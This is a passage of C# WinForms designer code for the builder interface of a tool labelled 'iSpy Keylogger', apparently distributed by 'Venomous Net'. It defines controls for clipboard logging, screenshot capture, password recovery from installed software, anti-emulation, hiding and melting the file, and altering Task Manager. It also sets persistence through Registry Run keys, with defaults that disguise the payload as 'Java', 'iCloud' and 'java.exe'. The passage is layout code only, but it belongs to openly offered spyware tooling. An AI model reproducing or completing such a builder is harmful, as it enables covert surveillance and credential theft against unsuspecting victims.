            this.cbAntiEmulation.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.cbAntiEmulation.Location = new System.Drawing.Point(272, 223);
            this.cbAntiEmulation.Name = "cbAntiEmulation";
            this.cbAntiEmulation.Size = new System.Drawing.Size(128, 19);
            this.cbAntiEmulation.TabIndex = 26;
            this.cbAntiEmulation.Text = "Anti-Emulation";
            // 
            // cbCaptureScreenshots
            // 
            this.cbCaptureScreenshots.BackColor = System.Drawing.Color.Transparent;
            this.cbCaptureScreenshots.Checked = false;
            this.cbCaptureScreenshots.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.cbCaptureScreenshots.Location = new System.Drawing.Point(30, 353);
            this.cbCaptureScreenshots.Name = "cbCaptureScreenshots";
            this.cbCaptureScreenshots.Size = new System.Drawing.Size(172, 19);
            this.cbCaptureScreenshots.TabIndex = 25;
            this.cbCaptureScreenshots.Text = "Capture Screenshots";
            // 
            // cbMeltFile
            // 
            this.cbMeltFile.BackColor = System.Drawing.Color.Transparent;
            this.cbMeltFile.Checked = false;
            this.cbMeltFile.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.cbMeltFile.Location = new System.Drawing.Point(30, 310);
            this.cbMeltFile.Name = "cbMeltFile";
            this.cbMeltFile.Size = new System.Drawing.Size(204, 19);
            this.cbMeltFile.TabIndex = 24;
            this.cbMeltFile.Text = "Melt File";
            // 
            // cbModifyTaskManager
            // 
            this.cbModifyTaskManager.BackColor = System.Drawing.Color.Transparent;
            this.cbModifyTaskManager.Checked = false;
            this.cbModifyTaskManager.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.cbModifyTaskManager.Location = new System.Drawing.Point(30, 266);
            this.cbModifyTaskManager.Name = "cbModifyTaskManager";
            this.cbModifyTaskManager.Size = new System.Drawing.Size(204, 19);
            this.cbModifyTaskManager.TabIndex = 23;
            this.cbModifyTaskManager.Text = "Modify Task Manager";
            // 
            // cbClipboardLogger
            // 
            this.cbClipboardLogger.BackColor = System.Drawing.Color.Transparent;
            this.cbClipboardLogger.Checked = false;
            this.cbClipboardLogger.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.cbClipboardLogger.Location = new System.Drawing.Point(30, 223);
            this.cbClipboardLogger.Name = "cbClipboardLogger";
            this.cbClipboardLogger.Size = new System.Drawing.Size(204, 19);
            this.cbClipboardLogger.TabIndex = 22;
            this.cbClipboardLogger.Text = "Clipboard Logger";
            // 
            // lblMutex
            // 
            this.lblMutex.AutoSize = true;
            this.lblMutex.BackColor = System.Drawing.Color.Transparent;
            this.lblMutex.Font = new System.Drawing.Font("Segoe UI", 11F);
            this.lblMutex.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblMutex.Location = new System.Drawing.Point(24, 181);
            this.lblMutex.Name = "lblMutex";
            this.lblMutex.Size = new System.Drawing.Size(53, 20);
            this.lblMutex.TabIndex = 21;
            this.lblMutex.Text = "Mutex:";
            // 
            // tbMutex
            // 
            this.tbMutex.BackColor = System.Drawing.Color.Transparent;
            this.tbMutex.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbMutex.ForeColor = System.Drawing.Color.DimGray;
            this.tbMutex.Location = new System.Drawing.Point(81, 178);
            this.tbMutex.MaxLength = 32767;
            this.tbMutex.Multiline = false;
            this.tbMutex.Name = "tbMutex";
            this.tbMutex.ReadOnly = false;
            this.tbMutex.Size = new System.Drawing.Size(391, 28);
            this.tbMutex.TabIndex = 20;
            this.tbMutex.Text = "Drag your mouse in the box above";
            this.tbMutex.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbMutex.UseSystemPasswordChar = false;
            // 
            // randomPool
            // 
            this.randomPool.Location = new System.Drawing.Point(26, 56);
            this.randomPool.Name = "randomPool";
            this.randomPool.Size = new System.Drawing.Size(446, 111);
            this.randomPool.TabIndex = 19;
            this.randomPool.Text = "nsRandomPool1";
            this.randomPool.ValueChanged += new NSRandomPool.ValueChangedEventHandler(this.randomPool_ValueChanged);
            // 
            // separator3
            // 
            this.separator3.Location = new System.Drawing.Point(26, 37);
            this.separator3.Name = "separator3";
            this.separator3.Size = new System.Drawing.Size(446, 10);
            this.separator3.TabIndex = 18;
            this.separator3.Text = "ambiance_Separator2";
            // 
            // lblGeneralSettings
            // 
            this.lblGeneralSettings.AutoSize = true;
            this.lblGeneralSettings.BackColor = System.Drawing.Color.Transparent;
            this.lblGeneralSettings.Font = new System.Drawing.Font("Segoe UI", 11F, System.Drawing.FontStyle.Bold);
            this.lblGeneralSettings.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblGeneralSettings.Location = new System.Drawing.Point(24, 15);
            this.lblGeneralSettings.Name = "lblGeneralSettings";
            this.lblGeneralSettings.Size = new System.Drawing.Size(124, 20);
            this.lblGeneralSettings.TabIndex = 17;
            this.lblGeneralSettings.Text = "General Settings";
            // 
            // panelPasswordRecovery
            // 
            this.panelPasswordRecovery.Controls.Add(this.lvPasswordRecovery);
            this.panelPasswordRecovery.Controls.Add(this.cbPasswordRecovery);
            this.panelPasswordRecovery.Controls.Add(this.separator5);
            this.panelPasswordRecovery.Controls.Add(this.lblPasswordRecovery);
            this.panelPasswordRecovery.Location = new System.Drawing.Point(246, 59);
            this.panelPasswordRecovery.Name = "panelPasswordRecovery";
            this.panelPasswordRecovery.Size = new System.Drawing.Size(498, 435);
            this.panelPasswordRecovery.TabIndex = 8;
            // 
            // lvPasswordRecovery
            // 
            this.lvPasswordRecovery.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.chSoftware,
            this.chVersions});
            this.lvPasswordRecovery.FullRowSelect = true;
            this.lvPasswordRecovery.GridLines = true;
            this.lvPasswordRecovery.HeaderStyle = System.Windows.Forms.ColumnHeaderStyle.Nonclickable;
            this.lvPasswordRecovery.Location = new System.Drawing.Point(26, 64);
            this.lvPasswordRecovery.Name = "lvPasswordRecovery";
            this.lvPasswordRecovery.Size = new System.Drawing.Size(446, 348);
            this.lvPasswordRecovery.SmallImageList = this.ilPasswordRecovery;
            this.lvPasswordRecovery.TabIndex = 12;
            this.lvPasswordRecovery.UseCompatibleStateImageBehavior = false;
            this.lvPasswordRecovery.View = System.Windows.Forms.View.Details;
            // 
            // chSoftware
            // 
            this.chSoftware.Text = "Software";
            this.chSoftware.Width = 210;
            // 
            // chVersions
            // 
            this.chVersions.Text = "Versions";
            this.chVersions.Width = 230;
            // 
            // cbPasswordRecovery
            // 
            this.cbPasswordRecovery.Location = new System.Drawing.Point(26, 18);
            this.cbPasswordRecovery.Name = "cbPasswordRecovery";
            this.cbPasswordRecovery.Size = new System.Drawing.Size(79, 27);
            this.cbPasswordRecovery.TabIndex = 11;
            this.cbPasswordRecovery.Text = "ambiance_Toggle2";
            this.cbPasswordRecovery.Toggled = false;
            this.cbPasswordRecovery.Type = Ambiance_Toggle._Type.OnOff;
            // 
            // separator5
            // 
            this.separator5.Location = new System.Drawing.Point(26, 47);
            this.separator5.Name = "separator5";
            this.separator5.Size = new System.Drawing.Size(446, 10);
            this.separator5.TabIndex = 10;
            this.separator5.Text = "ambiance_Separator5";
            // 
            // lblPasswordRecovery
            // 
            this.lblPasswordRecovery.AutoSize = true;
            this.lblPasswordRecovery.BackColor = System.Drawing.Color.Transparent;
            this.lblPasswordRecovery.Font = new System.Drawing.Font("Segoe UI", 11F, System.Drawing.FontStyle.Bold);
            this.lblPasswordRecovery.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblPasswordRecovery.Location = new System.Drawing.Point(113, 21);
            this.lblPasswordRecovery.Name = "lblPasswordRecovery";
            this.lblPasswordRecovery.Size = new System.Drawing.Size(145, 20);
            this.lblPasswordRecovery.TabIndex = 9;
            this.lblPasswordRecovery.Text = "Password Recovery";
            // 
            // panelVaccine
            // 
            this.panelVaccine.Controls.Add(this.lblVaccineLog);
            this.panelVaccine.Controls.Add(this.lbVaccineLog);
            this.panelVaccine.Controls.Add(this.btnRemoveKeylogger);
            this.panelVaccine.Controls.Add(this.lblVaccine);
            this.panelVaccine.Controls.Add(this.lblVaccineInfo);
            this.panelVaccine.Controls.Add(this.separator8);
            this.panelVaccine.Location = new System.Drawing.Point(246, 59);
            this.panelVaccine.Name = "panelVaccine";
            this.panelVaccine.Size = new System.Drawing.Size(498, 435);
            this.panelVaccine.TabIndex = 19;
            // 
            // lblVaccineLog
            // 
            this.lblVaccineLog.AutoSize = true;
            this.lblVaccineLog.BackColor = System.Drawing.Color.Transparent;
            this.lblVaccineLog.Font = new System.Drawing.Font("Segoe UI", 11F);
            this.lblVaccineLog.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblVaccineLog.Location = new System.Drawing.Point(179, 120);
            this.lblVaccineLog.Name = "lblVaccineLog";
            this.lblVaccineLog.Size = new System.Drawing.Size(119, 20);
            this.lblVaccineLog.TabIndex = 14;
            this.lblVaccineLog.Text = "[- Vaccine Log -]";
            // 
            // lbVaccineLog
            // 
            this.lbVaccineLog.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.lbVaccineLog.Font = new System.Drawing.Font("Microsoft Sans Serif", 11F);
            this.lbVaccineLog.FormattingEnabled = true;
            this.lbVaccineLog.IntegralHeight = false;
            this.lbVaccineLog.ItemHeight = 18;
            this.lbVaccineLog.Location = new System.Drawing.Point(14, 153);
            this.lbVaccineLog.Name = "lbVaccineLog";
            this.lbVaccineLog.Size = new System.Drawing.Size(451, 223);
            this.lbVaccineLog.TabIndex = 9;
            // 
            // btnRemoveKeylogger
            // 
            this.btnRemoveKeylogger.BackColor = System.Drawing.Color.Transparent;
            this.btnRemoveKeylogger.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.btnRemoveKeylogger.Image = null;
            this.btnRemoveKeylogger.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.btnRemoveKeylogger.Location = new System.Drawing.Point(14, 382);
            this.btnRemoveKeylogger.Name = "btnRemoveKeylogger";
            this.btnRemoveKeylogger.Size = new System.Drawing.Size(451, 30);
            this.btnRemoveKeylogger.TabIndex = 13;
            this.btnRemoveKeylogger.Text = "Scan";
            this.btnRemoveKeylogger.TextAlignment = System.Drawing.StringAlignment.Center;
            this.btnRemoveKeylogger.Click += new System.EventHandler(this.btnRemoveKeylogger_Click);
            // 
            // separator8
            // 
            this.separator8.Location = new System.Drawing.Point(19, 34);
            this.separator8.Name = "separator8";
            this.separator8.Size = new System.Drawing.Size(446, 10);
            this.separator8.TabIndex = 11;
            this.separator8.Text = "ambiance_Separator7";
            // 
            // lblVaccine
            // 
            this.lblVaccine.AutoSize = true;
            this.lblVaccine.BackColor = System.Drawing.Color.Transparent;
            this.lblVaccine.Font = new System.Drawing.Font("Segoe UI", 11F, System.Drawing.FontStyle.Bold);
            this.lblVaccine.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblVaccine.Location = new System.Drawing.Point(24, 15);
            this.lblVaccine.Name = "lblVaccine";
            this.lblVaccine.Size = new System.Drawing.Size(61, 20);
            this.lblVaccine.TabIndex = 10;
            this.lblVaccine.Text = "Vaccine";
            // 
            // lblVaccineInfo
            // 
            this.lblVaccineInfo.AutoSize = true;
            this.lblVaccineInfo.BackColor = System.Drawing.Color.Transparent;
            this.lblVaccineInfo.Font = new System.Drawing.Font("Segoe UI", 11F);
            this.lblVaccineInfo.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblVaccineInfo.Location = new System.Drawing.Point(10, 47);
            this.lblVaccineInfo.Name = "lblVaccineInfo";
            this.lblVaccineInfo.Size = new System.Drawing.Size(479, 60);
            this.lblVaccineInfo.TabIndex = 12;
            this.lblVaccineInfo.Text = "If the file was encrypted, this will most likely fail. However, other than \r\nthat" +
    ", this vaccine should find and terminate the keylogger. If it does not\r\nwork, th" +
    "en just contact Venomous Net.";
            // 
            // panelBuild
            // 
            this.panelBuild.Controls.Add(this.pbIcon);
            this.panelBuild.Controls.Add(this.lbBuildLog);
            this.panelBuild.Controls.Add(this.lblBuildLog);
            this.panelBuild.Controls.Add(this.btnBrowseIcon);
            this.panelBuild.Controls.Add(this.tbIconPath);
            this.panelBuild.Controls.Add(this.cbChangeIcon);
            this.panelBuild.Controls.Add(this.separator7);
            this.panelBuild.Controls.Add(this.lblBuild);
            this.panelBuild.Controls.Add(this.btnBuild);
            this.panelBuild.Location = new System.Drawing.Point(246, 59);
            this.panelBuild.Name = "panelBuild";
            this.panelBuild.Size = new System.Drawing.Size(498, 435);
            this.panelBuild.TabIndex = 10;
            // 
            // pbIcon
            // 
            this.pbIcon.Image = ((System.Drawing.Image)(resources.GetObject("pbIcon.Image")));
            this.pbIcon.Location = new System.Drawing.Point(368, 51);
            this.pbIcon.Name = "pbIcon";
            this.pbIcon.Size = new System.Drawing.Size(64, 64);
            this.pbIcon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pbIcon.TabIndex = 7;
            this.pbIcon.TabStop = false;
            // 
            // lbBuildLog
            // 
            this.lbBuildLog.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.lbBuildLog.Font = new System.Drawing.Font("Microsoft Sans Serif", 11F);
            this.lbBuildLog.FormattingEnabled = true;
            this.lbBuildLog.IntegralHeight = false;
            this.lbBuildLog.ItemHeight = 18;
            this.lbBuildLog.Location = new System.Drawing.Point(19, 155);
            this.lbBuildLog.Name = "lbBuildLog";
            this.lbBuildLog.Size = new System.Drawing.Size(446, 223);
            this.lbBuildLog.TabIndex = 18;
            // 
            // lblBuildLog
            // 
            this.lblBuildLog.AutoSize = true;
            this.lblBuildLog.BackColor = System.Drawing.Color.Transparent;
            this.lblBuildLog.Font = new System.Drawing.Font("Segoe UI", 11F);
            this.lblBuildLog.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblBuildLog.Location = new System.Drawing.Point(159, 130);
            this.lblBuildLog.Name = "lblBuildLog";
            this.lblBuildLog.Size = new System.Drawing.Size(147, 20);
            this.lblBuildLog.TabIndex = 17;
            this.lblBuildLog.Text = "[- Server Build Log -]";
            // 
            // btnBrowseIcon
            // 
            this.btnBrowseIcon.BackColor = System.Drawing.Color.Transparent;
            this.btnBrowseIcon.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.btnBrowseIcon.Image = null;
            this.btnBrowseIcon.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.btnBrowseIcon.Location = new System.Drawing.Point(163, 51);
            this.btnBrowseIcon.Name = "btnBrowseIcon";
            this.btnBrowseIcon.Size = new System.Drawing.Size(177, 30);
            this.btnBrowseIcon.TabIndex = 16;
            this.btnBrowseIcon.Text = "Browse";
            this.btnBrowseIcon.TextAlignment = System.Drawing.StringAlignment.Center;
            this.btnBrowseIcon.Click += new System.EventHandler(this.btnBrowseIcon_Click);
            // 
            // tbIconPath
            // 
            this.tbIconPath.BackColor = System.Drawing.Color.Transparent;
            this.tbIconPath.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbIconPath.ForeColor = System.Drawing.Color.DimGray;
            this.tbIconPath.Location = new System.Drawing.Point(19, 87);
            this.tbIconPath.MaxLength = 32767;
            this.tbIconPath.Multiline = false;
            this.tbIconPath.Name = "tbIconPath";
            this.tbIconPath.ReadOnly = false;
            this.tbIconPath.Size = new System.Drawing.Size(321, 28);
            this.tbIconPath.TabIndex = 15;
            this.tbIconPath.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbIconPath.UseSystemPasswordChar = false;
            // 
            // cbChangeIcon
            // 
            this.cbChangeIcon.BackColor = System.Drawing.Color.Transparent;
            this.cbChangeIcon.Checked = false;
            this.cbChangeIcon.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.cbChangeIcon.Location = new System.Drawing.Point(19, 59);
            this.cbChangeIcon.Name = "cbChangeIcon";
            this.cbChangeIcon.Size = new System.Drawing.Size(111, 19);
            this.cbChangeIcon.TabIndex = 14;
            this.cbChangeIcon.Text = "Change Icon";
            // 
            // separator7
            // 
            this.separator7.Location = new System.Drawing.Point(19, 36);
            this.separator7.Name = "separator7";
            this.separator7.Size = new System.Drawing.Size(446, 10);
            this.separator7.TabIndex = 13;
            this.separator7.Text = "ambiance_Separator6";
            // 
            // lblBuild
            // 
            this.lblBuild.AutoSize = true;
            this.lblBuild.BackColor = System.Drawing.Color.Transparent;
            this.lblBuild.Font = new System.Drawing.Font("Segoe UI", 11F, System.Drawing.FontStyle.Bold);
            this.lblBuild.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblBuild.Location = new System.Drawing.Point(24, 15);
            this.lblBuild.Name = "lblBuild";
            this.lblBuild.Size = new System.Drawing.Size(153, 20);
            this.lblBuild.TabIndex = 12;
            this.lblBuild.Text = "Build iSpy Keylogger";
            // 
            // btnBuild
            // 
            this.btnBuild.BackColor = System.Drawing.Color.Transparent;
            this.btnBuild.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.btnBuild.Image = null;
            this.btnBuild.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.btnBuild.Location = new System.Drawing.Point(19, 384);
            this.btnBuild.Name = "btnBuild";
            this.btnBuild.Size = new System.Drawing.Size(446, 30);
            this.btnBuild.TabIndex = 11;
            this.btnBuild.Text = "Build iSpy Keylogger Binary";
            this.btnBuild.TextAlignment = System.Drawing.StringAlignment.Center;
            this.btnBuild.Click += new System.EventHandler(this.btnBuild_Click);
            // 
            // panelInstallation
            // 
            this.panelInstallation.Controls.Add(this.gbOther);
            this.panelInstallation.Controls.Add(this.gbStartup);
            this.panelInstallation.Controls.Add(this.gbInstallation);
            this.panelInstallation.Controls.Add(this.cbInstallation);
            this.panelInstallation.Controls.Add(this.separator2);
            this.panelInstallation.Controls.Add(this.lblInstallation);
            this.panelInstallation.Location = new System.Drawing.Point(246, 59);
            this.panelInstallation.Name = "panelInstallation";
            this.panelInstallation.Size = new System.Drawing.Size(498, 435);
            this.panelInstallation.TabIndex = 5;
            // 
            // gbOther
            // 
            this.gbOther.Controls.Add(this.cbHideFile);
            this.gbOther.Controls.Add(this.cbStartupPersistence);
            this.gbOther.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.gbOther.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.gbOther.Location = new System.Drawing.Point(26, 327);
            this.gbOther.Name = "gbOther";
            this.gbOther.Size = new System.Drawing.Size(446, 61);
            this.gbOther.TabIndex = 19;
            this.gbOther.TabStop = false;
            this.gbOther.Text = "Other";
            // 
            // cbHideFile
            // 
            this.cbHideFile.BackColor = System.Drawing.Color.Transparent;
            this.cbHideFile.Checked = false;
            this.cbHideFile.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.cbHideFile.Location = new System.Drawing.Point(297, 28);
            this.cbHideFile.Name = "cbHideFile";
            this.cbHideFile.Size = new System.Drawing.Size(94, 19);
            this.cbHideFile.TabIndex = 16;
            this.cbHideFile.Text = "Hide File";
            // 
            // cbStartupPersistence
            // 
            this.cbStartupPersistence.BackColor = System.Drawing.Color.Transparent;
            this.cbStartupPersistence.Checked = false;
            this.cbStartupPersistence.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.cbStartupPersistence.Location = new System.Drawing.Point(38, 28);
            this.cbStartupPersistence.Name = "cbStartupPersistence";
            this.cbStartupPersistence.Size = new System.Drawing.Size(165, 19);
            this.cbStartupPersistence.TabIndex = 15;
            this.cbStartupPersistence.Text = "Startup Persistence";
            // 
            // gbStartup
            // 
            this.gbStartup.Controls.Add(this.cbHKLM);
            this.gbStartup.Controls.Add(this.cbHKCU);
            this.gbStartup.Controls.Add(this.tbHKLM);
            this.gbStartup.Controls.Add(this.tbHKCU);
            this.gbStartup.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.gbStartup.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.gbStartup.Location = new System.Drawing.Point(26, 209);
            this.gbStartup.Name = "gbStartup";
            this.gbStartup.Size = new System.Drawing.Size(446, 112);
            this.gbStartup.TabIndex = 18;
            this.gbStartup.TabStop = false;
            this.gbStartup.Text = "Startup";
            // 
            // cbHKLM
            // 
            this.cbHKLM.BackColor = System.Drawing.Color.Transparent;
            this.cbHKLM.Checked = false;
            this.cbHKLM.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.cbHKLM.Location = new System.Drawing.Point(10, 72);
            this.cbHKLM.Name = "cbHKLM";
            this.cbHKLM.Size = new System.Drawing.Size(286, 19);
            this.cbHKLM.TabIndex = 15;
            this.cbHKLM.Text = "HKEY_Local_Machine\\Software\\...\\Run";
            // 
            // cbHKCU
            // 
            this.cbHKCU.BackColor = System.Drawing.Color.Transparent;
            this.cbHKCU.Checked = false;
            this.cbHKCU.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.cbHKCU.Location = new System.Drawing.Point(10, 33);
            this.cbHKCU.Name = "cbHKCU";
            this.cbHKCU.Size = new System.Drawing.Size(277, 19);
            this.cbHKCU.TabIndex = 14;
            this.cbHKCU.Text = "HKEY_Current_User\\Software\\...\\Run";
            // 
            // tbHKLM
            // 
            this.tbHKLM.BackColor = System.Drawing.Color.Transparent;
            this.tbHKLM.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbHKLM.ForeColor = System.Drawing.Color.DimGray;
            this.tbHKLM.Location = new System.Drawing.Point(302, 65);
            this.tbHKLM.MaxLength = 32767;
            this.tbHKLM.Multiline = false;
            this.tbHKLM.Name = "tbHKLM";
            this.tbHKLM.ReadOnly = false;
            this.tbHKLM.Size = new System.Drawing.Size(138, 28);
            this.tbHKLM.TabIndex = 13;
            this.tbHKLM.Text = "iCloud";
            this.tbHKLM.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbHKLM.UseSystemPasswordChar = false;
            // 
            // tbHKCU
            // 
            this.tbHKCU.BackColor = System.Drawing.Color.Transparent;
            this.tbHKCU.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbHKCU.ForeColor = System.Drawing.Color.DimGray;
            this.tbHKCU.Location = new System.Drawing.Point(302, 26);
            this.tbHKCU.MaxLength = 32767;
            this.tbHKCU.Multiline = false;
            this.tbHKCU.Name = "tbHKCU";
            this.tbHKCU.ReadOnly = false;
            this.tbHKCU.Size = new System.Drawing.Size(138, 28);
            this.tbHKCU.TabIndex = 11;
            this.tbHKCU.Text = "Java";
            this.tbHKCU.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbHKCU.UseSystemPasswordChar = false;
            // 
            // gbInstallation
            // 
            this.gbInstallation.Controls.Add(this.tbProcess);
            this.gbInstallation.Controls.Add(this.lblProcess);
            this.gbInstallation.Controls.Add(this.comboBoxDirectory);
            this.gbInstallation.Controls.Add(this.lblSubfolder);
            this.gbInstallation.Controls.Add(this.tbSubfolder);
            this.gbInstallation.Controls.Add(this.lblDirectory);
            this.gbInstallation.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.gbInstallation.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.gbInstallation.Location = new System.Drawing.Point(26, 65);
            this.gbInstallation.Name = "gbInstallation";
            this.gbInstallation.Size = new System.Drawing.Size(446, 138);
            this.gbInstallation.TabIndex = 17;
            this.gbInstallation.TabStop = false;
            this.gbInstallation.Text = "Install File";
            // 
            // tbProcess
            // 
            this.tbProcess.BackColor = System.Drawing.Color.Transparent;
            this.tbProcess.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbProcess.ForeColor = System.Drawing.Color.DimGray;
            this.tbProcess.Location = new System.Drawing.Point(118, 92);
            this.tbProcess.MaxLength = 32767;
            this.tbProcess.Multiline = false;
            this.tbProcess.Name = "tbProcess";
            this.tbProcess.ReadOnly = false;
            this.tbProcess.Size = new System.Drawing.Size(322, 28);
            this.tbProcess.TabIndex = 13;
            this.tbProcess.Text = "java.exe";
            this.tbProcess.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbProcess.UseSystemPasswordChar = false;
            // 
            // lblProcess
            // 
            this.lblProcess.AutoSize = true;
            this.lblProcess.BackColor = System.Drawing.Color.Transparent;
            this.lblProcess.Font = new System.Drawing.Font("Segoe UI", 11F);
            this.lblProcess.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblProcess.Location = new System.Drawing.Point(47, 96);
            this.lblProcess.Name = "lblProcess";
            this.lblProcess.Size = new System.Drawing.Size(61, 20);
            this.lblProcess.TabIndex = 12;
            this.lblProcess.Text = "Process:";
            // 
            // comboBoxDirectory
            // 
            this.comboBoxDirectory.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(246)))), ((int)(((byte)(246)))), ((int)(((byte)(246)))));
            this.comboBoxDirectory.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.comboBoxDirectory.DropDownHeight = 100;
            this.comboBoxDirectory.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboBoxDirectory.Font = new System.Drawing.Font("Segoe UI", 10F);
            this.comboBoxDirectory.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(142)))), ((int)(((byte)(142)))), ((int)(((byte)(142)))));
            this.comboBoxDirectory.FormattingEnabled = true;
            this.comboBoxDirectory.HoverSelectionColor = System.Drawing.Color.Empty;
            this.comboBoxDirectory.IntegralHeight = false;
            this.comboBoxDirectory.ItemHeight = 20;
            this.comboBoxDirectory.Items.AddRange(new object[] {
            "Application Data",
            "Local Application Data",
            "My Documents",
            "Temp"});
            this.comboBoxDirectory.Location = new System.Drawing.Point(118, 26);
            this.comboBoxDirectory.Name = "comboBoxDirectory";
            this.comboBoxDirectory.Size = new System.Drawing.Size(322, 26);
            this.comboBoxDirectory.StartIndex = 0;
            this.comboBoxDirectory.TabIndex = 9;
            // 
            // lblSubfolder
            // 
            this.lblSubfolder.AutoSize = true;
            this.lblSubfolder.BackColor = System.Drawing.Color.Transparent;
            this.lblSubfolder.Font = new System.Drawing.Font("Segoe UI", 11F);
            this.lblSubfolder.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblSubfolder.Location = new System.Drawing.Point(25, 62);
            this.lblSubfolder.Name = "lblSubfolder";
            this.lblSubfolder.Size = new System.Drawing.Size(83, 20);
            this.lblSubfolder.TabIndex = 10;
            this.lblSubfolder.Text = "Sub-folder:";
            // 
            // tbSubfolder
            // 
            this.tbSubfolder.BackColor = System.Drawing.Color.Transparent;
            this.tbSubfolder.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbSubfolder.ForeColor = System.Drawing.Color.DimGray;
            this.tbSubfolder.Location = new System.Drawing.Point(118, 58);
            this.tbSubfolder.MaxLength = 32767;
            this.tbSubfolder.Multiline = false;
            this.tbSubfolder.Name = "tbSubfolder";
            this.tbSubfolder.ReadOnly = false;
            this.tbSubfolder.Size = new System.Drawing.Size(322, 28);
            this.tbSubfolder.TabIndex = 11;
            this.tbSubfolder.Text = "Java";
            this.tbSubfolder.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbSubfolder.UseSystemPasswordChar = false;
            // 
            // lblDirectory
            // 
            this.lblDirectory.AutoSize = true;
            this.lblDirectory.BackColor = System.Drawing.Color.Transparent;
            this.lblDirectory.Font = new System.Drawing.Font("Segoe UI", 11F);
            this.lblDirectory.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblDirectory.Location = new System.Drawing.Point(35, 28);
            this.lblDirectory.Name = "lblDirectory";
            this.lblDirectory.Size = new System.Drawing.Size(73, 20);
            this.lblDirectory.TabIndex = 8;
            this.lblDirectory.Text = "Directory:";
            // 
            // cbInstallation
            // 
            this.cbInstallation.Location = new System.Drawing.Point(26, 20);
            this.cbInstallation.Name = "cbInstallation";
            this.cbInstallation.Size = new System.Drawing.Size(79, 27);
            this.cbInstallation.TabIndex = 16;
            this.cbInstallation.Text = "ambiance_Toggle1";
            this.cbInstallation.Toggled = false;
            this.cbInstallation.Type = Ambiance_Toggle._Type.OnOff;
            // 
            // separator2
            // 
            this.separator2.Location = new System.Drawing.Point(26, 49);
            this.separator2.Name = "separator2";
            this.separator2.Size = new System.Drawing.Size(446, 10);
            this.separator2.TabIndex = 15;
            this.separator2.Text = "ambiance_Separator3";
            // 
            // lblInstallation
            // 
            this.lblInstallation.AutoSize = true;
            this.lblInstallation.BackColor = System.Drawing.Color.Transparent;
            this.lblInstallation.Font = new System.Drawing.Font("Segoe UI", 11F, System.Drawing.FontStyle.Bold);
